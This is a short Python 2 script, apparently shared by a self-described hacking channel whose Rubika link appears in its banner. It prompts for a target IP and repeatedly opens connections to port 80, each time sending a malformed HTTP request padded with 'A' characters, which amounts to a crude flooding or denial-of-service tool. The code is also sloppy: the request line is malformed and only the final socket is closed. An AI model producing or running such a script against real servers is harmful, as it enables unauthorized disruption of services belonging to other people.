

from socket import *
import time
print"----------[my cahannel:]----------"
print"[https://rubika.ir/creator_hacker_ravani]"

u = raw_input("Enter the ip = ")

p = 0
for i in range(1,1000):
	s = socket(AF_INET , SOCK_STREAM)
	s.connect((u , 80))
	pack = "A"*100
	s.send("GET / HTTP 1.1\r\n"+pack)
	p = p+1
	print "Send Packet ",p
	time.sleep(2)


s.close()